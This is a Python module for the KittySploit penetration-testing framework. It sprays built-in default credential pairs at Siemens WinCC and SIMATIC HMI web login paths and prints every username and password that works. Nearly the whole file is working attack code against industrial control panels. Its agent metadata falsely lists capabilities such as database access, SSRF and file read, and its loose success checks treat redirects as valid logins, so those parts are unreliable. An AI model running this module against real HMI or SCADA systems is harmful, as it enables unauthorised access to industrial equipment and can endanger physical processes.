#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.ics.siemens_defaults import HMI_DEFAULT_CREDENTIALS, HMI_LOGIN_PATHS


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Siemens HMI default credentials",
        "description": (
            "Tests common default credentials against Siemens WinCC / Comfort Panel / "
            "SIMATIC HMI web interfaces over HTTP(S)."
        ),
        "author": "KittySploit Team",
        "platform": Platform.OTHER,
        "tags": ["ics", "siemens", "hmi", "wincc", "default", "credentials"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['credential_spray', 'network_probe'],
        'expected_requests': 20,
        'reversible': True,
        'approval_required': True,
        'produces': ['credentials', 'risk_signals'],
        'cost': 1.0,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'ssrf_primitive', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'file_read', 'from_detail': 'lfi_path'},
                                   {'capability': 'lfi_param', 'from_detail': 'lfi_param'},
                                   {'capability': 'file_read', 'from_detail': 'lfi_path'},
                                   {'capability': 'lfi_param', 'from_detail': 'lfi_param'},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    port = OptPort(80, "HMI HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", False)
    path = OptString("", "Specific login path (empty = built-in list)", False)
    stop_on_success = OptBool(True, "Stop after first valid credential pair", False)

    def _paths(self) -> list[str]:
        custom = str(self.path or "").strip()
        if custom:
            return [custom]
        return list(HMI_LOGIN_PATHS)

    def check(self):
        if not str(self.target or "").strip():
            return {"vulnerable": False, "reason": "target not set", "confidence": "low"}
        return {"vulnerable": True, "reason": "ready to test HMI defaults", "confidence": "low"}

    def run(self):
        if not str(self.target or "").strip():
            print_error("Target is required")
            return False

        print_warning("Only test against authorized HMI/SCADA lab systems")
        paths = self._paths()
        print_status(f"Testing {len(HMI_DEFAULT_CREDENTIALS)} credential pair(s) on {len(paths)} path(s)...")

        for login_path in paths:
            for username, password in HMI_DEFAULT_CREDENTIALS:
                try:
                    response = self.http_request(
                        "GET",
                        login_path,
                        auth=(username, password),
                        allow_redirects=False,
                    )
                except Exception:
                    continue
                url = f"{self.target}:{self.port}{login_path}"
                if self._response_success(response, url, username, password):
                    if bool(self.stop_on_success):
                        return True
        print_info("No default HMI credentials accepted")
        return False

    def _response_success(self, response, url: str, username: str, password: str) -> bool:
        if response.status_code not in (200, 204, 301, 302, 303):
            return False
        body = (getattr(response, "text", "") or "").lower()
        if response.status_code in (301, 302, 303):
            print_success(f"Valid credentials on {url}: {username}:{password}")
            return True
        if any(token in body for token in ("logout", "wincc", "simatic", "portal", "mainview")):
            print_success(f"Valid credentials on {url}: {username}:{password}")
            return True
        if response.status_code == 200 and "login" not in body and "password" not in body:
            print_success(f"Valid credentials on {url}: {username}:{password}")
            return True
        return False
